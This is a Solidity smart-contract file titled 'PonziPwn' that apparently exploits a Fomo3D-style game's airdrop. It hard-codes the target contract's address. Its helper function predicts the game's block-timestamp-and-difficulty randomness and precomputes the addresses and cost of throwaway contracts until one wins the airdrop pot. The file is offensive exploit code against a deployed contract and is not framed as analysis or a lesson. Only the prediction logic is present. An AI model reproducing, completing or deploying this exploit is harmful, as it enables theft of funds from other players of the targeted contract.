interface GameOfSwordsInterface {
    function airDropTracker_() external returns (uint256);
    function airDropPot_() external returns (uint256);
    function withdraw() external;
}

contract PonziPwn {

    GameOfSwordsInterface private fomo3d = GameOfSwordsInterface(0xE7d2c826292CE8bDd5e51Ce44fff4033Be657269);
    uint256 private blankContractCost = 20000*1000 ;
    uint256 private pwnContractCost = 250000*1000;
    bool _canWin = false;

    address _newSender = address(keccak256(abi.encodePacked(0xd6, 0x94, address(this), 0x01)));
    uint256 _pwnCost = 0;
    uint256 _seed = 0;
    uint256 _tracker = fomo3d.airDropTracker_();

    function checkPwnData() private returns(uint256,address) {

        while(!_canWin) {
            _seed = uint256(keccak256(abi.encodePacked((block.timestamp) + (block.difficulty))));

            if((_seed - ((_seed / 1000) * 1000)) >= _tracker) {
                    _newSender = address(keccak256(abi.encodePacked(0xd6, 0x94, _newSender, 0x01)));
                    _pwnCost+= blankContractCost;
            } else {
                    _canWin = true;
                    _pwnCost += pwnContractCost;
            }
        }
        return (_pwnCost,_newSender);
    }
}